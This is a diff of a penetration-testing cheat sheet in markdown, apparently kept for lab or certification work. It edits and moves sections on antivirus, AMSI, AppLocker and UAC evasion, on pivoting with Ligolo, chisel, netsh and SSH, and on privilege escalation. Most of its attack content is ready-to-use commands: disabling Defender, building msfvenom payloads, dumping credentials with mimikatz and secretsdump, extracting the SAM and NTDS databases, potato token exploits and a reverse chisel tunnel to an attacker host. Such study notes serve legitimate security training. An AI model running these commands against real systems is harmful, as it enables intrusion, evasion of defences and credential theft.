 | `XAMPP`    | C:\xampp\htdocs\       |
+
+**Default extensions:**
+
+- PHP Server
+
+```
+.php
+.php3
+.php4
+.php5
+.php7
+
+# Less known PHP extensions
+.pht
+.phps
+.phar
+.phpt
+.pgif
+.phtml
+.phtm
+.inc
+```
+
+- ASP Server
+
+```
+.asp
+.aspx
+.config
+.cer and .asa # (IIS <= 7.5)
+shell.aspx;1.jpg # (IIS < 7.0)
+shell.soap
+```
+
+- JSP : `.jsp, .jspx, .jsw, .jsv, .jspf, .wss, .do, .actions`
+
+- Perl: `.pl, .pm, .cgi, .lib`
+
+- Coldfusion: `.cfm, .cfml, .cfc, .dbm`
+
+- Node.js: `.js, .json, .node`
 
 ## Linux
 
@@ -2661,66 +3091,6 @@ $ stty rows [] columns []
 
 ## Windows
 
-### Evasion
-
-#### Antivirus Evasion
-
-You have an antivirus when you cannot execute malwares [Hacktricks](https://book.hacktricks.wiki/en/windows-hardening/av-bypass.html)
-
-- Enumeration
-  - `wmic /Node:localhost /Namespace:\\root\SecurityCenter2 Path AntivirusProduct Get displayName`
-  - `Get-MpComputerStatus`
-- Folder Exclusion Bypass
-  - Check Folders -> `reg query "HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions\Paths"`
-  - Place Malware in Allowed Folder
-- Disable AV (Code Execution as Admin)
-  - `powershell Set-MpPreference -DisableIOAVProtection $true`
-  - `powershell Set-MpPreference -DisableRealTimeMonitoring $true`
-- Malware Obfuscation tools:
-  - `msfvenom -p [WINDOWS_PAYLOAD] LHOST=[NIC] LPORT=4444 -f exe -x [WIN_BINARY] > out.exe` -> Choose "whoami" / "ping" / "plink"
-  - [Ebowla](https://0xdf.gitlab.io/2019/02/16/htb-giddy.html)
-  - Prometheus Shell
-    - [Download](https://github.com/paranoidninja/0xdarkvortex-MalwareDevelopment/blob/master/prometheus.cpp) + Change IP & Port
-    - 32/64-Bit Cross-Compile → `[i686-w64-mingw32-g++ / g++] prometheus.cpp -o prometheus.exe -lws2_32 -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc`
-
-#### Powershell evasion
-
-- Execution Policy
-  - `powershell -noni -nop -ep bypass -w hidden -NoExit [COMMAND]`
-  - `Set-ExecutionPolicy Bypass -Scope Process` -> From a PS Session
-  - 32/64-Bit Execution
-    - Try Both Binaries
-    - `c:\windows\syswow64\windowspowershell\v1.0\powershell.exe`
-    - `c:\windows\sysnative\windowspowershell\v1.0\powershell.exe`
-- AMSI
-  - Paste the payload in a PS session to bypass AMSI
-  - [Payloads Here](https://amsi.fail)
-- Constrained Language
-  - Check if enabled -> `$ExecutionContext.SessionState.LanguageMode`
-  - [Bypasses](https://sp00ks-git.github.io/posts/CLM-Bypass/)
-- AppLocker: excludes some folders that you can execute powershell from
-  - `Get-AppLockerPolicy -Effective | select -exp RuleCollections` 
-  - [Bypasses](https://github.com/api0cradle/UltimateAppLockerByPassList) / Run Scripts from Allowed Folders
-
-#### UAC
-
-When you are member of Administrators, but you have restricted privileges and file access of a true SYSTEM user
-
-- Enumeration
-  - Member of "Administrators" + Restricted Privileges / File Access
-  - `reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA` -> Check if greater than "0"
-  - `reg query HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v ConsentPromptBehaviorAdmin` -> Check if greater than "0"
-- Bypasess
-  - `[environment]::OSVersion.Version` → [UACME](https://github.com/hfiref0x/UACME) + [Checklist](https://academy.hackthebox.com/module/67/section/626) + Google Search
-  - Send Reverse Shell                            → Through a SYSTEM RCE / Similar Exploit
-  - GUI Access                        → CMD “Run as Administrator” → Input Credentials
-  - EventViewer Method
-    - [Load Module](https://github.com/CsEnox/EventViewer-UACBypass) → `Import-Module Invoke-EventViewer`
-    - Exploit            → `Invoke-EventViewer [PATH\TO\MALWARE.exe]`
-  - PSExec (Local / Remote)
-    - `PsExec.exe -h -s -i cmd` -> No Credentials
-    - `psexec.py [AUTH_STRING]` -> Requires Credentials
-
 ### File Transfer
 
 Check for a writable directory &rarr; Open a server &rarr; Use a download/upload method
@@ -2734,12 +3104,16 @@ To check permissions over an object -> `icacls [DIR/FILE]` Check for RX,WD or F
 - `C:\windows\tasks\`
 - `c\windows\system32\spool\drivers\color\`
 
+#### WinRM
+
+If you have a winRM shell, you can simply use the commands `upload` and `download` to transfer files from the folder you used to connect to winRM.
+
 #### SMB
 
 1. Create SMB server
 
    ```bash
-   smb_server() 
+   smbserv 
    ```
 
    New versions of Windows block unauthenticated guest access, in this case you need to set unsername and password in SMB
@@ -2964,7 +3338,7 @@ Defenders can use Web filtering solutions to prevent access to specific website 
 
 ***Errors:***
 
-- There may be cases when the Internet Explorer first-launch configuration has not been completed, which prevents the download. This can be bypassed using the parameter `-UseBasicParsing`.
+- There may be cases when the Internet Explorer first-launch configuration has not been completed, which prevents the download. This can be bypassed using the parameter `-useb`.
 
 - If the certificate is not trusted:
 
@@ -3160,9 +3534,9 @@ perl -e 'use LWP::Simple; getstore("[LINK]", "FILE");'
 
 #### SSH Hijacking
 
-- `ssh-keygen -t ed25519 -f [KEY_FILE]` → Paste in `C:\Users\[USERNAME]\.ssh\authorized_keys`
-- `chmod 600 [KEY_FILE]`
-- `ssh -i [KEY_FILE] [USER]@[IP]`
+- `ssh-keygen` → Paste your public key in `C:\Users\[USERNAME]\.ssh\authorized_keys`
+- `chmod 600 [KALI_PRIVATE_KEY_FILE]`
+- `ssh -i [KALI_PRIVATE_KEY_FILE] [USER]@[IP]`
 
 #### MSFVenom
 
@@ -3182,6 +3556,66 @@ perl -e 'use LWP::Simple; getstore("[LINK]", "FILE");'
     - Useful when Process Crashes
     - `echo "run post/windows/manage/migrate" > ~/automigrate.rc`
     - In `multi/handler` MSF Panel → `set AutoRunScript multi_console_command -r ~/automigrate.rc`
+
+### Evasion
+
+#### Antivirus Evasion
+
+You have an antivirus when you cannot execute malwares [Hacktricks](https://book.hacktricks.wiki/en/windows-hardening/av-bypass.html)
+
+- Enumeration
+  - `wmic /Node:localhost /Namespace:\\root\SecurityCenter2 Path AntivirusProduct Get displayName`
+  - `Get-MpComputerStatus`
+- Folder Exclusion Bypass
+  - Check Folders -> `reg query "HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions\Paths"`
+  - Place Malware in Allowed Folder
+- Disable AV (Code Execution as Admin)
+  - `powershell Set-MpPreference -DisableIOAVProtection $true`
+  - `powershell Set-MpPreference -DisableRealTimeMonitoring $true`
+- Malware Obfuscation tools:
+  - `msfvenom -p [WINDOWS_PAYLOAD] LHOST=[NIC] LPORT=4444 -f exe -x [WIN_BINARY] > out.exe` -> Choose "whoami" / "ping" / "plink"
+  - [Ebowla](https://0xdf.gitlab.io/2019/02/16/htb-giddy.html)
+  - Prometheus Shell
+    - [Download](https://github.com/paranoidninja/0xdarkvortex-MalwareDevelopment/blob/master/prometheus.cpp) + Change IP & Port
+    - 32/64-Bit Cross-Compile → `[i686-w64-mingw32-g++ / g++] prometheus.cpp -o prometheus.exe -lws2_32 -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc`
+
+#### Powershell evasion
+
+- Execution Policy
+  - `powershell -noni -nop -ep bypass -w hidden -NoExit [COMMAND]`
+  - `Set-ExecutionPolicy Bypass -Scope Process` -> From a PS Session
+  - 32/64-Bit Execution
+    - Try Both Binaries
+    - `c:\windows\syswow64\windowspowershell\v1.0\powershell.exe`
+    - `c:\windows\sysnative\windowspowershell\v1.0\powershell.exe`
+- AMSI
+  - Paste the payload in a PS session to bypass AMSI
+  - [Payloads Here](https://amsi.fail)
+- Constrained Language
+  - Check if enabled -> `$ExecutionContext.SessionState.LanguageMode`
+  - [Bypasses](https://sp00ks-git.github.io/posts/CLM-Bypass/)
+- AppLocker: excludes some folders that you can execute powershell from
+  - `Get-AppLockerPolicy -Effective | select -exp RuleCollections` 
+  - [Bypasses](https://github.com/api0cradle/UltimateAppLockerByPassList) / Run Scripts from Allowed Folders
+
+#### UAC
+
+When you are member of Administrators, but you have restricted privileges and file access of a true SYSTEM user
+
+- Enumeration
+  - Member of "Administrators" + Restricted Privileges / File Access
+  - `reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA` -> Check if greater than "0"
+  - `reg query HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v ConsentPromptBehaviorAdmin` -> Check if greater than "0"
+- Bypasess
+  - `[environment]::OSVersion.Version` → [UACME](https://github.com/hfiref0x/UACME) + [Checklist](https://academy.hackthebox.com/module/67/section/626) + Google Search
+  - Send Reverse Shell                            → Through a SYSTEM RCE / Similar Exploit
+  - GUI Access                        → CMD “Run as Administrator” → Input Credentials
+  - EventViewer Method
+    - [Load Module](https://github.com/CsEnox/EventViewer-UACBypass) → `Import-Module Invoke-EventViewer`
+    - Exploit            → `Invoke-EventViewer [PATH\TO\MALWARE.exe]`
+  - PSExec (Local / Remote)
+    - `PsExec.exe -h -s -i cmd` -> No Credentials
+    - `psexec.py [AUTH_STRING]` -> Requires Credentials
 
 ## Metasploit
 
@@ -3324,11 +3758,11 @@ In `msfconsole`:  -> `load [plugin]`
 
 ### Meterpreter migration (Windows)
 
-in `meterpreter`, when the shell doesn't appear:
+in `meterpreter`, when the shell doesn't appear or SeDebug Privileges:
 
 ```bash
 ps		# List processes
-steal_token [PID of process network or local service]
+steal_token [PID of process network or local service/SYSTEM Process]
 ```
 
 # Privilege Escalation
@@ -3353,13 +3787,13 @@ A way to access services that cannot be accessed by the outside
 
 Kali -> Pivot Host -> Intranet Host (private)
 
-The <PivotIntranetIP> is the private IP of the Pivot Host that can communicate with the Intranet Host, that is the two IPs share the first blocks, while the <IP> is the public one, that you can already connect to.
+The <PivotIntranetIP> is the private IP of the Pivot Host that can communicate with the Intranet Host, that is the two IPs share the first blocks, while the <IP> is its public one, that you can already connect to.
 
 #### Local forwarding
 
 Send a local service to your machine. 
 
-- **Ligolo**
+- **Ligolo** (64 bits only)
 
   1. On your machine, run `ligstart` to start the ligolo server
 
@@ -3403,40 +3837,96 @@ Send a local service to your machine.
 
 Access private subnetworks of the target. Forwards all the service of the private subnetworks to you.
 
-On the target machine, run `ifconfig` to see if there is a private network open. Then check the CIDR of the private networks:
+**METHOD:**
 
-- Linux -> `ip route`
-- Windows -> `route -n`
+1. `ifconfig`/`ipconfig` to see if there is a private network open
 
-Tools:
+2. Pivoting (methods below)
+
+3. Ping sweep: get the Ips different than the Pivot Intranet IP
+
+   - `alive <CIDR>` for Ligolo
+
+   - Local Linux (proxychains methods):
+
+     ```bash
+     for i in {1..254} ;do (ping -c 1 172.16.5.$i | grep "bytes from" &) ;done
+     ```
+
+   - Local Windows (proxychains methods):
+
+     ```bash
+     for %i in (1 1 254) do ping 172.16.5.%i -n 1 -w 100 | find "Reply"
+     ```
+
+4. nmap 
+
+   - with proxychains on the alive hosts:
+
+     ```bash
+     sudo proxychains nmap -v -Pn -sT [IP]
+     ```
+
+   - with Ligolo:
+
+     ```bash
+     sudo nmap -PE -sCV
+     ```
+
+5. Enter in a proxychained ZSH so you don't have to type everytime
+
+   `sudo proxychains zsh`
+
+**TOOLS:**
 
 - **Ligolo**: Win/Lin only 64bit
 
-  1. To get the `CIDR` , note the corresponding intranet IP with `ip route`
+  1. On your machine, run `ligstart` to start the ligolo server
 
-  2. On your machine, run `ligstart` to start the ligolo server
+  2. File transfer  the agent on the target from `TOOLS/LIGOLO_AGENTS/`
 
-  3. File transfer  the agent on the target from `TOOLS/ligolo-ng/dist`
-
-  4. On the target:
+  3. On the target:
 
      ```bash
-     ./agent -connect [TUNIP]:[LigoloPort] -ignore-cert
+     ./agent -connect [TUNIP]:11601 -ignore-cert
      ```
 
-  5. On the ligolo server:
+  4. On the ligolo server:
 
-    ```
-  session
-  # Select the session
-  start 
-    ```
+     `session` &rarr; `Select number` &rarr; `start` 
 
   6. On you PC, add the route
 
-    ```bash
-  sudo ip route add [CIDR] dev ligolo
-    ```
+     ```bash
+     sudo ip route add [CIDR] dev ligolo
+     ```
+
+     Start with the smallest `CIDR`, i.e. given the Intranet Pivot IP, and go bigger if you don't find anything in the smallest range:
+
+     `172.16.5.4` &rarr; `172.16.5.0/24` &rarr; `172.16.0.0/16` &rarr; `172.0.0.0/8`
+
+  7. **-----------------------------------Duble Tunneling--------------------------**
+
+  8. In the first pivot session: 
+
+     `listener_add --addr 0.0.0.0:11601 --to [KALI_IP]:11601 --tcp`
+
+  9. Transfer the agent on the second pivot
+
+     ```bash
+     ligolo-agent -connect [FIRST_PIVOT_INTRANET_IP]:11601 -ignore-cert
+     ```
+
+  10. On Kali, create a new ligolo session
+
+      ```bash
+      ligcreate ligolo2
+      sudo ip route add [SECOND_INTRANET_CIDR] dev ligolo2
+      ```
+
+  11. On Ligolo:
+
+      `session` → `Select Number 2` → `start --tun ligolo2`
 
 - **SSH**
 
@@ -3452,37 +3942,13 @@ Tools:
      [PROXY] 127.0.0.1 9050	
      ```
 
-  3. To discover internal hosts, do a local ping sweep on the pivot target:
+  3. SShuttle allows to perform pivoting similar to ligolo, without proxychains
 
-     - Linux:
+    ```bash
+    sshuttle -r [USER]@[IP] [-i KEY] [INTRANET_CIDR]
+    ```
 
-     ```bash
-     for i in {1..254} ;do (ping -c 1 172.16.5.$i | grep "bytes from" &) ;done
-     ```
-
-     - Windows:
-
-     ```cmd
-     %i in (1 1 254) do ping 172.16.5.%i -n 1 -w 100 | find "Reply"
-     ```
-
-  4. Run `nmap` (we can only perform a TCP connect scan over proxychains) 
-
-     ```bash
-     sudo proxychains nmap -v -Pn -sT [IP]
-     ```
-
-  5. Interact through `proxychains` with other services eg:
-
-     `sudo proxychains firefox-esr`
-
-     `sudo proxychains ftp [INTERNAL_FTP_IP]`
-
-  6. Alternatively, enter in a proxychained ZSH so you don't have to type everytime
-
-     `proxychains zsh`
-
-  7. To discover alive hosts in the internal network, do a local ping sweep on the pivot host
+    
 
 - **Rpivot** (SOCKS tunneling)
 
@@ -3502,17 +3968,80 @@ Tools:
 
   4. Use proxychains
 
-- **Metasploit**
+- **Netsh (Windows with Administrator priviledges)**
 
-- **plink.exe**
+  Pivots by *connecting* the intranet IP to the Pivot address, which is *listening*.
 
-- **sshuttle**
+  ```cmd
+  netsh.exe interface portproxy add v4tov4 listenport=8080 listenaddress=[PIVOT_IP] connectport=3389 connectaddress=[INTRANET_IP]
+  ```
+
+  Verify:
+
+  ```cmd
+  netsh.exe interface portproxy show v4tov4
+  ```
+
+  Then, from Kali, you can connect to the listen address diractly using xfreerdp or others `xfreerdp /v:[PIVOT_IP]`
 
 - **chisel**: Win/Lin also 32bit
 
-- **netsh**
+  1. Transfer chisel binary on the pivot host
 
-- **socat**
+     ```bash
+     cd ~/TOOLS/CHISEL
+     scp chisel <user>@<PivotIP>:<pathChisel>
+     ```
+
+     - Linux architecture: `uname -a`
+     - Win architecture: `systeminfo`
+
+  2. Run the server on the Pivot Host
+
+     ````bash
+     ./chisel server -v -p 1234 --socks5
+     ````
+
+  3. On Kali, connect to the server
+
+     ```bash
+     ./chisel client -v <PivotIP>:1234 socks
+     ```
+
+  4. In `/etc/proxychains4.conf` add `socks5 127.0.0.1 1080`
+
+  5. Use `proxychains` to <IntranetIP>
+
+- **chisel (reverse):**
+
+  1. On Kali, start the server:
+
+     ```bash
+     sudo ~/TOOLS/CHISEL/chisel_lin64 server --reverse -v -p 1234 --socks5
+     ```
+
+  2. On the Pivot Host:
+
+     ```bash
+     ./chisel client -v 10.10.14.17:1234 R:socks
+     ```
+
+  3. Add `socks5 127.0.0.1 1080` in `/etc/proxychains4.conf` 
+
+  4. Connect with `proxychains`
+
+- **Metasploit**
+
+- plink.exe
+
+- netsh
+
+- socat
+
+- dnscat (very stealthy, uses DNS)
+
+- Ptunnel
+
 
 #### Remote/reverse forwarding
 
@@ -3567,8 +4096,6 @@ Forward a local service to a remote port. Usually used to gain shells or exchang
      ssh -R <PivotIntranetIP>:<PayloadPort>:0.0.0.0:<ListenPort> <User>@<IP> -vN
      ```
 
-- **chisel**
-
 - **Metasploit**
 
 - **Socat**
@@ -3581,13 +4108,13 @@ Forward a local service to a remote port. Usually used to gain shells or exchang
 - User Group:
 
   -  `id` and what can that group do
-  -  [interesting_groups](https://book.hacktricks.xyz/linux-hardening/privilege-escalation/interesting-groups-linux-pe)
+  -  [interesting_groups](https://hacktricks.boitatech.com.br/linux-unix/privilege-escalation/interesting-groups-linux-pe)
 
 ### Privileges
 
 Search on [gtfobins](https://gtfobins.github.io) bin files with relative privileges
 
-##### sudo
+##### SUDO
 
 ```bash
 sudo -l		 # List sudo privileges
@@ -3637,9 +4164,10 @@ sudo -u [USER] [COMMAND] 	# Execute an application as an user
     ln -s [FILE HOP] [FILE]			# Creates a link to FILE HOP
     ```
 
-##### suid
+##### SUID
 
-`find / -perm -u=s -type f 2>/dev/null`: checks for *SUID binaries* 
+- `find / -perm -u=s -type f 2>/dev/null`
+- Non-Default / [SUID3ENUM](https://github.com/Anon-Exploiter/SUID3NUM) Tool / GTFOBin
 
 ### Credential Hunting
 
@@ -3680,21 +4208,22 @@ sudo -u [USER] [COMMAND] 	# Execute an application as an user
 
 - Readable / Owned web files (for web application)
 
-  - `find /var/www -type f -group [group] 2>/dev/null`  
+  - `find / -type f -group [group] 2>/dev/null`  
 
-  - `find /var/www -type f -user [user] 2>/dev/null`
+  - `find / -type f -user [user] 2>/dev/null`
 
-  - `find /var/www -type f -readable 2>/dev/null`
+  - `find / -type f -readable 2>/dev/null`
 
-  - `/proc` and `sis` `run` not interesting
+  - `/proc` and `sys` `run` not interesting
 
-- Scheduled Tasks:
+- Cronjobs:
 
   **Add new scheduled task:** If we can write to a directory called by a cron job, we can write a bash script with a reverse shell command, which should send us a reverse  shell when executed by the root.
 
   - `/etc/crontab`
+  - `/var/spool/anacrontab`
   - `/etc/cron.d`
-  - `/var/spool/cron/crontabs/root`
+  - `/var/spool/cron/crontabs`
 
 - SSH keys:  
 
@@ -3718,40 +4247,116 @@ sudo -u [USER] [COMMAND] 	# Execute an application as an user
 
 ### Local Network Services
 
-- `netstat -puntal` or `ss -puntal` (access/ tunnel)
-
-
-Look at `LISTEN` ports
+- `netstat -puntal | grep LISTEN` 
+- `ss -puntal | grep LISTEN` 
 
 ### Local Processes
 
 - `ps -aux | grep [USER, ROOT...]`
-- `ps -aux` look for local databases
+- Look for local databases / chrome debuggers / password managers
 
 ### OS 
 
-- Kernel Exploits
+- Kernel Exploits: `uname -a` 
 
-- Vulnerable Software: `dpkg -l` 
+- Vulnerable Software: `dpkg -l`  (Nagios / CUPS / Screen 4.5.0 / Non-Default)
+
+### Docker Breakout
+
+To check if you are in a docker container type `hostname`. A docker has a random string as hostname.
+
+- If you are root you can read the shadow password file `/etc/shadow`
 
 ## Windows
 
-### Users
+### Fundamentals
+
+#### cmd
+
+```cmd
+powershell								# Opens powershell
+powershell -command "<PS command>"		# Exectes PS command
+```
+
+#### Powershell
+
+```powershell
+start cmd.exe				# Opens cmd
+cmd /c "<CMD Command>"		# Execute CMD command
+```
+
+### Users & Privileges
 
 - Users & Groups
   - `net user`
-  - `net localgroup`
-  - `net user [USER]`
+  - for every user: `net user [USER]`
+  - `tree /a /f c:\users`
 - Memberships & Privileges
 
   -  `whoami /all`
-  -  Check non-default groups -> [Exploits](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/privileged-groups-and-token-privileges)
-  -  Check non-default privileges -> [Exploits](https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation)
+  -  Check non-default groups -> [Exploits](https://book.hacktricks.wiki/en/windows-hardening/active-directory-methodology/privileged-groups-and-token-privileges.html)
+  -  Check non-default privileges -> [Exploits](https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/privilege-escalation-abusing-tokens.html?highlight=sebackup#sebackupprivilege)
      - `SeDebug`
-     - `SeBackup`
+     - `SeBackup`: full read access
      - `SeImpersonate` / `SeAssignPrimaryToken`
-     - `SeRestore`
+     - `SeRestore` &rarr; [xct_exploit](https://github.com/dxnboy/redteam/blob/master/SeRestoreAbuse.exe)
      - `SeManage`
+
+#### SeImpersonate / SeAssignPrimaryToken
+
+You must be a **Service Account:** `SQL / IIS / NETWORK / LOCAL`
+
+Get the [CLSID](https://github.com/ohpe/juicy-potato/tree/master/CLSID/Windows_Server_2008_R2_Enterprise)
+
+- Churrasco - Server 2003
+- JuicyPotato - Server 2008 - 2016 - Win 10 < 1803
+- GodPotato - Server 2012 - 2022
+- PrintSpoofer - Windows 10 / Server 2016 - 2019
+- [GenericPotato](https://github.com/micahvandeusen/GenericPotato) - Windows 7 - 10 / Server < 2019
+- [Hot Potato](https://github.com/Kevin-Robertson/Tater) - Windows 7 - 10 / Server 2008 - 2012 - PS Based
+- [MultiPotato](https://github.com/S3cur3Th1sSh1t/MultiPotato) - When Others Fail → Useful for MSSQL
+
+#### SeDebug
+
+Allows to steal credentials from common processes or get a SYSTEM shell, by executing the [Mimikatz](https://github.com/ParrotSec/mimikatz/tree/master/x64) binary 
+
+- LSASS / DPAPI / VAULT Dumping
+  - `mimikatz.exe '"privilege::debug" "token::elevate" "sekurlsa::logonPasswords"'`
+  - `mimikatz.exe '"privilege::debug" "token::elevate" "sekurlsa::dpapi"'`
+  - `mimikatz.exe ‘"privilege::debug" "token::elevate" "sekurlsa::credman"’`
+- SAM / LSA Dumping (steals *local* hashes -> users appearing in `net user`)
+  - `mimikatz.exe '"privilege::debug" "token::elevate" "lsadump::sam"'`
+  - `mimikatz.exe'"privilege::debug" "token::elevate" "lsadump::lsa /patch"'`
+- SYSTEM Shell
+  - Get PID -> `tasklist /v /fi "username eq SYSTEM"`
+  - [PS Module](https://github.com/decoder-it/psgetsystem/blob/master/psgetsys.ps1) -> `. .\psgetsys.ps1; ImpersonateFromParentPid -ppid [PID] -command [CMD] -cmdargs [ARGS]`
+  - [Method 2](https://github.com/bruno-1337/SeDebugPrivilege-Exploit) / [Method 3](https://github.com/dev-zzo/exploits-nt-privesc/blob/master/SeDebugPrivilege/SeDebugPrivilege.c)
+
+#### SeBackup
+
+- SAM Dumping (steals *local* hashes -> users appearing in `net user`)
+
+  1. `reg save hklm\sam c:\windows\temp\sam.sav`
+  2. `reg save hklm\system c:\windows\temp\system.sav`
+  3. Download on Kali system.sav and sam.sav
+  4. Extract hashes on Kali: `secretsdump.py -system system.sav -sam sam.sav LOCAL`
+
+- NTDS Dumping (Only on a DC Server)
+
+  - Backup the NTDS File
+
+    ```cmd
+    ntdsutil 'ac i ntds' 'ifm' 'create full c:\windows\temp\NTDS' q q
+    ```
+    
+  - Export to kali the following files
+  
+    - `C:\Windows\Temp\NTDS\Active Directory\ntds.dit`
+    - `C:\Windows\Temp\NTDS\registry\SYSTEM`
+  
+  - Extract hashes on Kali
+  
+    - `secretsdump.py -ntds ntds.dit -system SYSTEM LOCAL`
 
 ### Credential Hunting:
 
@@ -3759,7 +4364,9 @@ Look at `LISTEN` ports
 
   - Desktop: `cd C:\Users\[USER]\Desktop`
 
-  - configuration fikes
+  - configuration files in installed applications 
+
+    In `C:` or `Program Files`, usually they end with `.ini`, `.txt`
 
   - log files
 
@@ -3798,14 +4405,18 @@ Look at `LISTEN` ports
 
 ### Local Network Services
 
-- `systeminfo`
+- `netstat -ano`
+- Network Information
+  - `route PRINT`
+  - `ipconfig /all`
+  - `arp -a`
+
 
 ### Local Processes
 
-- `tasklist` to check the processes
-
-- `netstat -ano` to check the services
-- `route -n` to check the routing table
+- `tasklist` 
+- Privileged Processes
+- Information in Process Strings
 
 ### Local Applications
 
@@ -3814,27 +4425,20 @@ Relevant directories:
 - `C:`
   - `inetpub\wwwroot` web application folder
   - `inetpub\ftproot` ftp root application
-  - custom folders
+  - custom folders -> `passcore` / Other Installed Software
 - `C:/Program Files` and `C:/Program Files (x86)`
   - custom/non default applications
+  - Mozilla Maintenance Service -> Firefox Memory Dump
 - `C:/ProgramData`
 - `C:/Users/[USERNAME]/appdata`
 
 ### OS
 
 
+- `systeminfo`
 - Kernel Exploits
-
-  - In meterpreter: local exploit suggester module
+- In meterpreter: local exploit suggester module
 - Vulnerable Software:  `C:\Program Files` 
-
-## Jail Brekout
-
-### Docker
-
-To check if you are in a docker container type `hostname`. A docker has a random string as hostname.
-
-- If you are root you can read the shadow password file `/etc/shadow`
 
 # OSINT
 
